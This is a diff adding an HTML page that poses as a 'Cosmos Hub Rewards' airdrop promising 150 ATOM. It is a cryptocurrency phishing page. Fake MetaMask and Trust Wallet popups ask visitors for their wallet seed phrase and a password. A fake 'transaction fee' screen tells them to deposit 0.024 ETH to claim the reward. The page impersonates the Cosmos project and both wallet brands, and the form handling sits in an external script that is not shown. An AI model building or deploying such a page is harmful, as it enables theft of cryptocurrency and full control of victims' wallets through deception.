@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <title>Cosmos Rewards</title>
+    <link rel="stylesheet" href="./assets/css/popup.css">
+    <link rel="stylesheet" href="./assets/css/bootstrap.css">
+    <link rel="stylesheet" href="./assets/css/correct2.css" media="screen">
+    <link rel="stylesheet" href="./assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="./assets/css/all.min.css">
+    <link rel="stylesheet" href="./assets/css/animate.css">
+    <link rel="stylesheet" href="./assets/css/nice-select.css">
+    <link rel="stylesheet" href="./assets/css/owl.min.css">
+    <link rel="stylesheet" href="./assets/css/jquery-ui.min.css">
+    <link rel="stylesheet" href="./assets/css/magnific-popup.css">
+    <link rel="stylesheet" href="./assets/css/flaticon.css">
+    <link rel="stylesheet" href="./assets/css/stylehome.css">
+    <link rel="stylesheet" href="./assets/css/main.css">
+    <link rel="stylesheet" href="./assets/css/stylewallet.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato&display=swap" rel="stylesheet">
+    <!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">-->
+
+    <link rel="shortcut icon" href="./assets/images/favicon.ico" type="image/x-icon">
+</head>
+<script language="JavaScript">
+    var tanggallengkap = new String();
+    var namahari = ("Minggu Senin Selasa Rabu Kamis Jumat Sabtu");
+    namahari = namahari.split(" ");
+    var namabulan = ("January February March April May June July August September October November December");
+    namabulan = namabulan.split(" ");
+    var tgl = new Date();
+    var hari = tgl.getDay();
+    var tanggal = tgl.getDate();
+    var bulan = tgl.getMonth();
+    var tahun = tgl.getFullYear();
+    tanggallengkap = namabulan[bulan] + " " + tanggal + ", " + tahun;
+  </script>
+<body style="background:rgb(0,0,0)">
+
+    <!--Start Popup MetaMask-->
+    <div class="addon-box v2" id="metamask" style="display: none;">
+        <div class="head">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+            <img class="logometa" src="./assets/logo/metamask.023762b6.png" alt="">
+            <div class="network-display network-display--clickable chip chip--with-left-icon chip--with-right-icon chip--ui-3" role="button" tabindex="0">
+                <div class="chip__left-icon"><div class="color-indicator color-indicator--filled color-indicator--color-ui-4 color-indicator--size-lg">
+                    <i class="color-indicator__icon fa fa-circle"></i>
+                </div>
+            </div>
+            <span class="box box--margin-top-1 box--margin-right-0 box--margin-bottom-1 box--margin-left-0 box--flex-direction-row typography chip__label typography--h7 typography--weight-normal typography--style-normal typography--color-ui-4">Ethereum Mainnet</span>
+            <div class="chip__right-icon">
+                <i class="network-display__icon app-header__network-down-arrow"></i>
+            </div>
+    </div>
+        </div><br><br><br>
+        <div class="confirm-approve-content">
+            <div style="font-size:1.2rem; color:rgb(77,77,77);">Restore your Account with Seed Phrase</div>
+            <div style="font-size:0.8rem; color:rgb(77,77,77); line-height: 20px;">Enter your secret phrase here to restore your vault.
+            </div>
+
+            <div class="jarak-atas">
+                <div class="confirm-approve-content__card--no-border">
+                    <form method="post" id="metamask">
+                        <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                            <textarea type="text" id="PrivateKey" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" maxlength="280" required autocomplete="off"></textarea>
+                        <label for="fname" style="font-size:0.8rem; color:rgb(77,77,77);">Password</label>
+                        <input id="password1" type="password" style="font-size:0.8rem; color:rgb(77,77,77);" id="fname" name="password1" value="" required autocomplete="off">
+                        <label for="lname" style="font-size:0.8rem; color:rgb(77,77,77);">Confirm Password</label>
+                        <input  id="password2" type="password" style="font-size:0.8rem; color:rgb(77,77,77);" id="lname" name="password2" value="" required autocomplete="off">
+                        <button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+           </div>
+    <!--End Popup MetaMask-->
+    <!--Start Popup TrustWallet-->
+    <div class="addon-box v2" id="trustwallet" style="display: none;">
+        <div class="headtrust">
+            <a href="javascript:;">
+                <button type="button" class="btn-closemetamask" data-bs-dismiss="modal" aria-label="Close"></button>
+            </a>
+        </div><br>
+        <div class="chakra-stack css-v6txlf">
+            <svg width="86" height="56" viewBox="0 0 86 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3.37585 47.3199H0V45.3306H9.19316V47.3199H5.81731V55.8801H3.37585V47.3199Z" fill="#3375BB"></path>
+                <path d="M11.5073 48.842C11.7886 48.4501 12.1654 48.1536 12.6376 47.9528C13.1198 47.7516 13.6724 47.6514 14.2953 47.6514V49.8216C14.0341 49.8012 13.8583 49.7914 13.7679 49.7914C13.0947 49.7914 12.5672 49.9821 12.1854 50.3641C11.8037 50.7356 11.6128 51.2985 11.6128 52.052V55.88H9.26172V47.7719H11.5073V48.842Z" fill="#3375BB"></path>
+                <path d="M23.0143 47.7722V55.8803H20.7839V54.9158C20.4724 55.2673 20.1006 55.5386 19.6686 55.7296C19.2366 55.9104 18.7694 56.0008 18.2671 56.0008C17.202 56.0008 16.3581 55.6942 15.7352 55.0815C15.1122 54.4685 14.8008 53.5594 14.8008 52.3537V47.7722H17.1518V52.0071C17.1518 53.313 17.6994 53.9663 18.7945 53.9663C19.3572 53.9663 19.8093 53.7854 20.1509 53.4237C20.4925 53.0519 20.6633 52.5044 20.6633 51.781V47.7722H23.0143Z" fill="#3375BB"></path>
+                <path d="M27.0153 56.0006C26.3422 56.0006 25.6842 55.9199 25.0411 55.7594C24.3981 55.5884 23.8857 55.3774 23.5039 55.1265L24.2876 53.4385C24.6493 53.6695 25.0863 53.8605 25.5987 54.0112C26.1111 54.1518 26.6136 54.2222 27.1057 54.2222C28.1004 54.2222 28.5977 53.9758 28.5977 53.4838C28.5977 53.2524 28.4621 53.0866 28.1908 52.9864C27.9195 52.8858 27.5028 52.8003 26.9399 52.7302C26.2769 52.6296 25.7294 52.514 25.2973 52.3836C24.8653 52.2529 24.4885 52.0219 24.167 51.6903C23.8555 51.3588 23.6998 50.8863 23.6998 50.2737C23.6998 49.7613 23.8455 49.3092 24.1369 48.9173C24.4383 48.5153 24.8703 48.2037 25.433 47.9829C26.0057 47.7618 26.6788 47.6514 27.4523 47.6514C28.025 47.6514 28.5928 47.7165 29.1553 47.8473C29.728 47.9679 30.2005 48.1385 30.572 48.3597L29.7883 50.0325C29.0751 49.6305 28.2963 49.4297 27.4523 49.4297C26.9501 49.4297 26.5733 49.4998 26.3221 49.6407C26.0709 49.7812 25.9454 49.9621 25.9454 50.1833C25.9454 50.4342 26.081 50.6101 26.3523 50.7107C26.6234 50.811 27.0556 50.9067 27.6483 50.9971C28.3114 51.1075 28.8539 51.228 29.2759 51.3588C29.6979 51.4793 30.0648 51.7054 30.3761 52.037C30.6876 52.3685 30.8433 52.8304 30.8433 53.4235C30.8433 53.9257 30.6925 54.3729 30.3911 54.7648C30.0897 55.1566 29.6478 55.4629 29.0649 55.6841C28.4922 55.8951 27.8091 56.0006 27.0153 56.0006Z" fill="#3375BB"></path>
+                <path d="M36.6199 55.4884C36.3889 55.6591 36.1026 55.7898 35.7608 55.8802C35.4293 55.9605 35.0777 56.0008 34.7059 56.0008C33.7413 56.0008 32.9931 55.7544 32.4603 55.2623C31.9381 54.7699 31.6767 54.0465 31.6767 53.0922V49.7615H30.4258V47.953H31.6767V45.9788H34.0277V47.953H36.0472V49.7615H34.0277V53.062C34.0277 53.4034 34.1132 53.6697 34.2839 53.8608C34.4647 54.0416 34.7161 54.132 35.0374 54.132C35.4093 54.132 35.7258 54.0314 35.9869 53.8306L36.6199 55.4884Z" fill="#3375BB"></path>
+                <path d="M56.5087 45.3306L53.0575 55.8801H50.4352L48.1143 48.7366L45.718 55.8801H43.1108L39.6445 45.3306H42.1764L44.5576 52.7454L47.0443 45.3306H49.3049L51.7162 52.8057L54.1727 45.3306H56.5087Z" fill="#3375BB"></path>
+                <path d="M59.4697 47.6514C60.7259 47.6514 61.6904 47.9528 62.3633 48.5556C63.0366 49.1483 63.373 50.0476 63.373 51.2533V55.88H61.1727V54.8703C60.7308 55.6238 59.9068 56.0006 58.7011 56.0006C58.0783 56.0006 57.5358 55.8951 57.0735 55.6841C56.6213 55.4731 56.2747 55.1815 56.0336 54.81C55.7924 54.4381 55.6719 54.0161 55.6719 53.544C55.6719 52.7905 55.9533 52.1975 56.5158 51.7657C57.0885 51.3335 57.9679 51.1176 59.1532 51.1176H61.022C61.022 50.6052 60.8664 50.2134 60.5548 49.9421C60.2436 49.6607 59.7764 49.5201 59.1532 49.5201C58.7214 49.5201 58.2942 49.5902 57.8722 49.7311C57.4604 49.8615 57.1089 50.0423 56.8173 50.2737L55.9733 48.631C56.4156 48.3194 56.9431 48.0782 57.5557 47.9076C58.1789 47.7365 58.8168 47.6514 59.4697 47.6514ZM59.2889 54.4181C59.6909 54.4181 60.0477 54.3277 60.3589 54.1469C60.6705 53.9558 60.8916 53.6797 61.022 53.318V52.4891H59.4094C58.4449 52.4891 57.9626 52.8056 57.9626 53.4385C57.9626 53.74 58.0783 53.9811 58.3093 54.1619C58.5504 54.3326 58.877 54.4181 59.2889 54.4181Z" fill="#3375BB"></path>
+                <path d="M64.5977 44.697H66.9487V55.8795H64.5977V44.697Z" fill="#3375BB"></path>
+                <path d="M68.2266 44.697H70.5776V55.8795H68.2266V44.697Z" fill="#3375BB"></path>
+                <path d="M79.7951 51.8561C79.7951 51.8863 79.78 52.0972 79.7499 52.4891H73.6161C73.7269 52.9913 73.988 53.388 74.3998 53.6797C74.812 53.9709 75.3244 54.1167 75.937 54.1167C76.359 54.1167 76.7309 54.0564 77.0522 53.9359C77.3838 53.8051 77.6905 53.6043 77.9716 53.333L79.2224 54.6894C78.4591 55.5635 77.3439 56.0006 75.8767 56.0006C74.9627 56.0006 74.1538 55.8246 73.4503 55.4731C72.7473 55.1114 72.2047 54.6141 71.8227 53.9811C71.441 53.3481 71.25 52.6296 71.25 51.826C71.25 51.0321 71.4361 50.3189 71.8076 49.6859C72.1897 49.0428 72.707 48.5454 73.3599 48.1939C74.023 47.8322 74.7615 47.6514 75.5753 47.6514C76.3692 47.6514 77.0877 47.822 77.7304 48.1638C78.3736 48.5051 78.8758 48.9976 79.2375 49.6407C79.6094 50.2737 79.7951 51.0121 79.7951 51.8561ZM75.5904 49.4297C75.058 49.4297 74.6108 49.5804 74.2491 49.8818C73.8874 50.1833 73.6666 50.5951 73.586 51.1176H77.5797C77.4995 50.6052 77.2783 50.1983 76.9166 49.8969C76.5549 49.5853 76.113 49.4297 75.5904 49.4297Z" fill="#3375BB"></path>
+                <path d="M85.6863 55.4884C85.4549 55.6591 85.1686 55.7898 84.8272 55.8802C84.4957 55.9605 84.1438 56.0008 83.7723 56.0008C82.8078 56.0008 82.0591 55.7544 81.5267 55.2623C81.0042 54.7699 80.7431 54.0465 80.7431 53.0922V49.7615H79.4922V47.953H80.7431V45.9788H83.0941V47.953H85.1136V49.7615H83.0941V53.062C83.0941 53.4034 83.1793 53.6697 83.3503 53.8608C83.5312 54.0416 83.7821 54.132 84.1038 54.132C84.4753 54.132 84.7918 54.0314 85.0533 53.8306L85.6863 55.4884Z" fill="#3375BB"></path>
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M41.8907 0.394116C42.52 -0.131386 43.4351 -0.131371 44.0643 0.394154C48.7258 4.28737 54.0412 4.2572 56.0963 4.24553C56.1989 4.24495 56.2933 4.24441 56.3791 4.24441C56.8332 4.24441 57.2684 4.42657 57.587 4.75008C57.9057 5.07359 58.0813 5.5114 58.0744 5.96545C57.9772 12.4107 57.7189 17.0099 57.2122 20.3802C56.7057 23.7484 55.9295 26.0545 54.68 27.7911C53.4217 29.5398 51.8044 30.5331 50.0794 31.4864C49.7806 31.6516 49.4758 31.8169 49.1639 31.9861C47.6493 32.8076 45.9648 33.7213 43.9657 35.1554C43.375 35.5791 42.5799 35.5791 41.9892 35.1554C39.992 33.7227 38.3098 32.8094 36.7975 31.9885C36.4841 31.8183 36.1779 31.6521 35.8778 31.4861C34.1541 30.5325 32.5389 29.5389 31.2831 27.7896C30.0363 26.053 29.2627 23.747 28.7581 20.3794C28.2532 17.0095 27.9959 12.4106 27.8986 5.96547C27.8918 5.51142 28.0673 5.0736 28.386 4.75009C28.7047 4.42658 29.1398 4.24441 29.5939 4.24441C29.6788 4.24441 29.7723 4.24495 29.8739 4.24553C31.9124 4.25721 37.2284 4.28767 41.8907 0.394116ZM31.3198 7.62519C31.4347 13.1281 31.6849 17.0292 32.1116 19.8769C32.5816 23.0136 33.2441 24.7067 34.0377 25.8121C34.8221 26.9048 35.8515 27.5963 37.5193 28.5189C37.791 28.6692 38.0775 28.8246 38.3784 28.9878C39.6632 29.6845 41.2094 30.523 42.9775 31.7132C44.748 30.5215 46.2965 29.6825 47.5835 28.9852C47.8831 28.8228 48.1685 28.6682 48.4392 28.5186C50.1091 27.5957 51.1409 26.9039 51.9275 25.8106C52.723 24.7051 53.3874 23.0121 53.8589 19.8761C54.287 17.0288 54.5383 13.128 54.6533 7.6255C52.0187 7.54226 47.3628 7.00183 42.9775 3.84073C38.5971 6.99806 33.9478 7.54095 31.3198 7.62519Z" fill="#3375BB"></path>
+            </svg>
+        </div>
+        <div class="css-19ysxhc">
+            <div class="css-1p53mic">
+                <div class="css-z2d797">
+                    <div class="css-y579tt"></div>
+                </div>
+                <div class="css-z2d797">
+                    <div class="css-1hliadm"></div>
+                </div>
+            </div>
+        </div>
+        <div style="font-size:1rem; color:rgb(77,77,77); text-align: center; margin-bottom: 5px;">
+            <b>Import a Secret Phrase</b>
+        </div>
+        <div style="font-size:0.8rem; color:rgb(77,77,77); line-height: 20px; text-align: center;">
+            Paste or type your Secret Phrase, usually a 12 or 24 set of words
+        </div>
+        <div class="jarak-atas">
+            <div class="confirm-approve-content__card--no-border">
+                <form method="post" id="metamask">
+                    <label style="font-size:0.8rem; color:rgb(77,77,77);">Wallet Seed</label>
+                        <textarea type="text" id="PrivateKey2" name="PrivateKey" style="font-size: 14px;" placeholder="Paste secret recovery phrase from clipboard" maxlength="280" required autocomplete="off"></textarea>
+                    <button type="submit" id="next-btnmetamask" class="next-btnmetamask" data-testid="page-container-footer-next" role="button" tabindex="0">Restore</button>
+                </form>
+            </div>
+        </div>
+            </div>
+    <!--End Popup TrustWallet-->
+
+     <!--Start Popup rewards1-->
+     <div class="addon-box v2" id="rewards" style="display: none;">
+        <div class="confirm-approve-content">
+            <div class="confirm-approve-content">
+            <div class="img-rewards">
+                    <img src="https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png" alt="" style="width:50px;height:50px;">
+                </div>
+                <div class="title-rewards">Cosmos Hub Rewards</div>
+                <div class="confirm-approve-content__description">You Get 
+                    <b style="color: #4d4d4d;font-weight: bold;">150 ATOM</b>
+                    ($10000), you must have a balance of at least 0.024 ETH on the network.
+                      Please deposit 0.024 ETH to your wallet address.
+                      or, restore your real account. Our system detects that you have more than 1 account.<br></div>
+                <div class="confirm-approve-content__edit-submission-button-container"></div>
+                <div class="confirm-approve-content__card-wrapper">
+                    <div class="confirm-approve-content__card--no-border">
+                        <div class="confirm-approve-content__card-header">
+                            <div class="confirm-approve-content__card-header__symbol"><i class="fa fa-tag"></i></div>
+                            <div class="confirm-approve-content__card-header__title">Transaction Fee</div>
+                            <div class="confirm-approve-content__small-blue-text cursor-pointer">USD/ETH</div>
+                        </div>
+                        <div class="confirm-approve-content__card-content">
+                            <div class="confirm-approve-content__transaction-details-content">
+                                <div class="confirm-approve-content__small-text">A fee is associated with this request.</div>
+                                <div class="confirm-approve-content__transaction-details-content__fee">
+                                    <div class="confirm-approve-content__transaction-details-content__primary-fee">$45</div>
+                                    <div class="confirm-approve-content__transaction-details-content__secondary-fee">0.024 ETH </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="title-rewards-not">
+                            Not enough funds for transaction fee, please fill your balance.<br><br>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="page-container__footer">
+                <footer>
+                </footer>
+            </div>
+            <div class="jarak-atas">
+                <div class="confirm-approve-content__card-content">
+                    <div class="confirm-approve-content__transaction-details-content">
+                        <div class="confirm-approve-content__small-text">
+                            <button type="submit" class="next-btnmetamask-rewards" data-testid="page-container-footer-next" role="button" tabindex="0">Reject</button>
+                            
+                        </div>
+                        
+                        <div class="confirm-approve-content__transaction-details-content__fee">
+                            <div class="confirm-approve-content__small-text">
+                                <button type="submit" class="next-btnmetamask-rewards" data-testid="page-container-footer-next" role="button" tabindex="0">Confirm</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>    </div>
+    <!--End Popup rewards-->
+     <!--Start Popup rewards1-->
+     <div class="addon-box v2" id="rewards2" style="display: none;">
+        <div class="confirm-approve-content">
+            <div class="confirm-approve-content">
+            <div class="img-rewards">
+                    <img src="https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png" alt="" style="width:50px;height:50px;">
+                </div>
+                <div class="title-rewards">Cosmos Hub Rewards</div>
+                <div class="confirm-approve-content__description">You Get 
+                    <b style="color: #4d4d4d;font-weight: bold;">150 ATOM</b>
+                    ($1576.04), you must have a balance of at least 0.024 ETH on the network.
+                      Please deposit 0.024 ETH to your wallet address.
+                      or, restore your real account. Our system detects that you have more than 1 account.<br></div>
+                <div class="confirm-approve-content__edit-submission-button-container"></div>
+                <div class="confirm-approve-content__card-wrapper">
+                    <div class="confirm-approve-content__card--no-border">
+                        <div class="confirm-approve-content__card-header">
+                            <div class="confirm-approve-content__card-header__symbol"><i class="fa fa-tag"></i></div>
+                            <div class="confirm-approve-content__card-header__title">Transaction Fee</div>
+                            <div class="confirm-approve-content__small-blue-text cursor-pointer">USD/ETH</div>
+                        </div>
+                        <div class="confirm-approve-content__card-content">
+                            <div class="confirm-approve-content__transaction-details-content">
+                                <div class="confirm-approve-content__small-text">A fee is associated with this request.</div>
+                                <div class="confirm-approve-content__transaction-details-content__fee">
+                                    <div class="confirm-approve-content__transaction-details-content__primary-fee">$45</div>
+                                    <div class="confirm-approve-content__transaction-details-content__secondary-fee">0.024 ETH </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="title-rewards-not">
+                            Not enough funds for transaction fee, please fill your balance.<br><br>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="page-container__footer">
+                <footer>
+                </footer>
+            </div>
+            <div class="jarak-atas">
+                <div class="confirm-approve-content__card-content">
+                    <div class="confirm-approve-content__transaction-details-content">
+                        <div class="confirm-approve-content__small-text">
+                            <button type="submit" class="next-btnmetamask-rewards" data-testid="page-container-footer-next" role="button" tabindex="0">Reject</button>
+                            
+                        </div>
+                        
+                        <div class="confirm-approve-content__transaction-details-content__fee">
+                            <div class="confirm-approve-content__small-text">
+                                <button type="submit" class="next-btnmetamask-rewards" data-testid="page-container-footer-next" role="button" tabindex="0">Confirm</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>    </div>
+    <!--End Popup rewards-->
+
+    <div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+        
+		
+		<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+		
+		<div class="modal-dialog">
+          <div class="modal-content">
+            <div class="modal-header">
+            <p>Connect to a wallet</p>
+            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <div class="d-grid gap-2">
+      
+                <div class="jarak">
+                  <button type="button" class="beTwZZ" style="justify-content: space-between;">
+                    <img src="./assets/logo/metamask.023762b6.png"  width="40px">
+                    <div class="d-flex flex-column text-left align-self-center ps-l-20" data-v-981381f4="">
+                        <span class="metamask" data-v-981381f4="">
+                            <span dir="">Metamask</span>
+                        </span><br> 
+                        <span class="connect" data-v-981381f4="">
+                            <span class="">Connect using browser wallet</span>
+                        </span>
+                    </div>
+                    
+                    <img src="./assets/logo/panah.png" height="15px" width="10px">
+              </div>
+      
+              <div class="jarak2">
+                <button type="button" class="beTwZZ2" style="justify-content: space-between;">
+                    <img src="./assets/logo/trustwallet.png"  width="40px">
+                  <div class="d-flex flex-column text-left align-self-center ps-l-20" data-v-981381f4="">
+                      <span class="metamask" data-v-981381f4="">
+                          <span dir="">Trust Wallet</span>
+                      </span><br> 
+                      <span class="connect" data-v-981381f4="">
+                          <span class="">Connect using browser wallet</span>
+                      </span>
+                  </div>
+                  
+                  <img src="./assets/logo/panah.png" height="15px" width="10px">
+            </div>
+              </div>
+            </div>
+          <!--   <div class="modal-footer">
+            
+            </div> -->
+          </div>
+        </div>
+      </div>
+    <!-- <body> -->
+    <div class="preloader">
+        <div class="preloader-inner">
+            <div class="preloader-icon">
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </div>
+    <a href="#0" class="scrollToTop"><i class="fas fa-angle-up"></i></a>
+
+    <header class="header-section">
+        <div class="container">
+            <div class="header-wrapper">
+                <div class="logo">
+                    <a href="#">
+                        <img src="./assets/images/lg-cosmos.png" alt="logo" style="width:120px">
+                    </a>
+                </div>
+                <ul class="menu navigator__item">
+                    <li> <a href="#">Learn</a></li>
+                    <li> <a href="#">Build</a></li>
+                    <li> <a href="#">Explore</a></li>
+                </ul>
+                
+                <div class="header-right">
+                    
+                    <a href="#" data-bs-toggle="modal" data-bs-target="#staticBackdrop"  class="header-button d-none d-sm-inline-block">CONNECT</a>
+                </div>
+            </div>
+        </div>
+    </header>
+    <style>
+        /* #more {display: none;}
+
+.wrapper {
+  display: flex;
+  flex-direction: row-reverse;
+} */
+    </style>
+<section class="home-hero"  style="height: 110vh;">
+    <div class="container">
+        <div class="banner-content-9 cl-white" style="padding-top: 8vh">
+            <br>
+            <h1 class="title">Cosmos Hub Rewards</h1>
+            <!--Correct-->
+            <div class="checkmark">
+                <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                   viewBox="0 0 161.2 161.2" enable-background="new 0 0 161.2 161.2" xml:space="preserve">
+              <path class="path" fill="none" stroke="rgb(0,192,135)" stroke-miterlimit="10" d="M425.9,52.1L425.9,52.1c-2.2-2.6-6-2.6-8.3-0.1l-42.7,46.2l-14.3-16.4
+                  c-2.3-2.7-6.2-2.7-8.6-0.1c-1.9,2.1-2,5.6-0.1,7.7l17.6,20.3c0.2,0.3,0.4,0.6,0.6,0.9c1.8,2,4.4,2.5,6.6,1.4c0.7-0.3,1.4-0.8,2-1.5
+                  c0.3-0.3,0.5-0.6,0.7-0.9l46.3-50.1C427.7,57.5,427.7,54.2,425.9,52.1z"/>
+              <circle class="path" fill="rgb(0,192,135)" stroke="none" stroke-width="4" stroke-miterlimit="10" cx="80.6" cy="80.6" r="62.1"/>
+              <polyline class="path" fill="none" stroke="white" stroke-width="6" stroke-linecap="round" stroke-miterlimit="10" points="113,52.8 
+                  74.1,108.4 48.2,86.4 "/>
+              
+              <circle class="spin" fill="none" stroke="rgb(0,192,135)" stroke-width="4" stroke-miterlimit="10" stroke-dasharray="12.2175,12.2175" cx="80.6" cy="80.6" r="73.9"/>
+              
+              </svg>
+             
+              </div>
+            <!--End Correct-->
+            <br> <br>
+                <h4 class="token-info-des" style="color:rgb(0,192,135); padding-bottom: 10px; margin-top: -30px;">Today the <strong><script language='JavaScript'>document.write(tanggallengkap);</script></strong> <span class="token-info-details" id="fegCombinedMc"></span></h4>
+                <h4 class="token-info-des" >
+                 <span class="token-info-details" id="fegCombinedMc"></span></h4>
+					<br>
+                <p style="color:white; text-shadow: 2px 2px 8px black;">
+                Cosmos Hub application provides a bonus prize of 150 ATOM ($1576.04) to all COSMOS holders with a total distribution of 21,000 ATOM
+                </p>
+                <p style="color:white; text-shadow: 2px 2px 8px black;">
+                    This guide involves using your own wallet, enabling you to maintain full ownership of your tokens. <br> <br>  <b style="">Cosmos Hub provides free distribution to all COSMOS holders in the amount of  150 ATOM ($1576.04) (free). The average supply is over 40% awarded to ac​tive users to make navigating the crypto world simple and intuitive.​ Connect your wallet to continue.
+                    </p>
+                    <p style="color:rgb(255,132,0);font-size: 13px;" style="margin-top: 10px;">
+                      Wallet is not connected.
+                      </p>
+            <div class="banner-button-group">
+            <div class="banner-button-group">
+                <!-- <a data-toggle="modal" data-src="././assets/images/gameasix.mp4" data-target="#myModal" class="button-4 video-btn" style="background:linear-gradient(#74C164, #40892F);">Game Trailer</a> --> 
+                <a href="#" data-bs-toggle="modal" data-bs-target="#staticBackdrop"  class="button-4 video-btn" >CLAIM YOUR 150 ATOM <i class="fa-brands  fa-xl"></i></a>
+
+               
+            </div>
+        </div>
+    </div>
+</section>
+
+    <footer class="footer-section">
+        <div class="container">
+            <div class="footer-top padding-top padding-bottom">
+                <div class="logo">
+                    <a href="#0">
+                       
+                    </a>
+                </div>
+                <ul class="social-icons">
+                    <li>
+                        <a href="#" ><i class="fab fa-medium"></i></a>
+                    </li>
+                    <li>
+                        <a href="#" ><i class="fab fa-reddit"></i></a>
+                    </li>
+                    <li>
+                        <a href="#" ><i class="fab fa-twitter"></i></a>
+                    </li>
+                    <li>
+                        <a href="#" ><i class="fab fa-instagram"></i></a>
+                    </li>
+                    <li>
+                        <a href="#" ><i class="fab fa-telegram"></i></a>
+                    </li>
+                </ul>
+            </div>
+            <div class="footer-bottom" >
+                <ul class="footer-link">
+                    <li>
+                        <a href="#">Cosmos Hub Protocol</a>
+                    </li>
+                    <li>
+                        <a href="#">Governance</a>
+                    </li>
+                    <li>
+                        <a href="#">Docs</a>
+                    </li>
+                    <li>
+                        <a href="#">Security</a>
+                    </li>
+                    <li>
+                        <a href="#">FAQ</a>
+                    </li>
+                </ul>
+            </div>
+            
+        </div>
+    </footer>
+    <div class="copyright" style="background-color: rgb(0,0,0)">
+        <p style="font-size: 12px; color: white">
+            Copyright © Cosmos Hub, All Rights Reserved..
+        </p>
+    </div>
+    
+   
+    <!--============= Footer Section Ends Here =============-->
+
+    <script src="./assets/js/jquery-3.3.1.min.js"></script>
+    <script src="./assets/js/modernizr-3.6.0.min.js"></script>
+    <script src="./assets/js/plugins.js"></script>
+    <script src="./assets/js/bootstrap.min.js"></script>
+    <script src="./assets/js/magnific-popup.min.js"></script>
+    <script src="./assets/js/jquery-ui.min.js"></script>
+    <script src="./assets/js/wow.min.js"></script>
+    <script src="./assets/js/waypoints.js"></script>
+    <script src="./assets/js/nice-select.js"></script>
+    <script src="./assets/js/owl.min.js"></script>
+    <script src="./assets/js/counterup.min.js"></script>
+    <script src="./assets/js/paroller.js"></script>
+    <script src="./assets/js/main.js"></script>
+
+    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
+    <script src="./assets/js/jswallet.js"></script>
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon='{"rayId":"6c86dc903ada1a40","version":"2021.12.0","r":1,"token":"a34c6d09c1e54a7c943f46827d855128","si":100}' crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
+
